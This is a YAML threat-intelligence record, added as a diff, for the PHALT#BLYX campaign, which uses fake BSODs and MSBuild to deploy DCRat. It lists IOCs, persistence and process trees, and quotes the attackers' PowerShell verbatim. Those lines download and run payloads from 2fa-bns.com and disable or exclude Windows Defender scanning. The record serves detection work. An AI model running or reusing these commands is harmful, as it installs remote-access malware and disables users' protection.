@@ -1,0 +1,76 @@
+description: PHALT#BLYX campaign uses fake BSODs and trusted build tools to deploy
+  a stealthy DCRat payload for remote access.
+attribution: Russian-linked threat actors/APT group
+malware_families: '[''Chameleon#NET'']'
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - msbuild.exe
+  - staxs.exe
+  - aspnet_compiler.exe
+  - tybd7.exe
+  commandline:
+  - powershell -c start https://admin.booking.com;$msb=(gci C:\\ -filter msbuild.exe
+    -r -ea 0|select -f 1).FullName;iwr https://2fa-bns.com/ -o $env:ProgramData\\v.proj;&
+    $msb $env:ProgramData\\v.proj
+  - Start-Process powershell ... -Verb RunAs
+  powershell:
+  - start https://admin.booking.com;$msb=(gci C:\\ -filter msbuild.exe -r -ea 0|select
+    -f 1).FullName;iwr https://2fa-bns.com/ -o $env:ProgramData\\v.proj;& $msb $env:ProgramData\\v.proj
+  - Add-MpPreference -ExclusionPath C:\\ProgramData
+  - Add-MpPreference -ExclusionExtension .exe
+  - Add-MpPreference -ExclusionExtension .ps1
+  - Add-MpPreference -ExclusionExtension .proj
+  - Set-MpPreference -DisableRealtimeMonitoring 1
+  - Start-BitsTransfer https://2fa-bns.com/win/ajsb.exe -Destination C:\\ProgramData\\staxs.exe
+  - Start-Process powershell ... -Verb RunAs
+  scripting_engine: []
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection
+  image_load:
+  - Lbpyjxefa.dll
+  network_connections:
+  - staxs.exe, asj77[.com, 3535
+  - staxs.exe, asj88[.com, 3535
+  - staxs.exe, asj99[.com, 3535
+  file_activity:
+  - C:\\ProgramData\\v.proj
+  - C:\\ProgramData\\staxs.exe
+  - C:\\Windows\\Temp\\tybd7.exe
+  - C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\DeleteApp.url
+  persistence:
+  - Create shortcut named update.lnk in the Startup folder
+  - Establishes persistence using a .url file pointing to a copy of the RAT malware
+    in C:\\Windows\\Temp
+  process_relations:
+  - powershell.exe->msbuild.exe
+  - staxs.exe->aspnet_compiler.exe
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 194.169.163.140
+  domains:
+  - oncameraworkout[.com
+  - low-house[.com
+  - 2fa-bns.com
+  - asj77[.com
+  - asj88[.com
+  - asj99[.com
+  urls:
+  - https://admin.booking.com
+  - https://2fa-bns.com/
+  - https://2fa-bns.com/win/ajsb.exe
+authors:
+- Shikha Sangwan
+- Akshay Gaikwad
+- Aaron Beardslee
+commandline: '[''cmd /c powershell -Command "Add-MpPreference -ExclusionPath \''C:\\ProgramData\''
+  -ErrorAction SilentlyContinue; Add-MpPreference-ExclusionExtension ''.exe'' -ErrorAction
+  SilentlyContinue; Add-MpPreference -ExclusionExtension ''.ps1l -Erroraction SilentlyContinue;
+  Add-MpPreference -ExclusionExtension *.proj -ErrorAction SilentlyComtinue; Add-MpPreference
+  -ExclusionExtension .tmp'' -ErrorAction SilentlyComtinue; Start-Sleep -Seconds1;
+  $admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()]).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)'
+reference: https://www.securonix.com/blog/analyzing-phaltblyx-how-fake-bsods-and-trusted-build-tools-are-used-to-construct-a-malware-infection
+date_of_publication: January 07, 2026
+file_creation_date: January 07, 2026
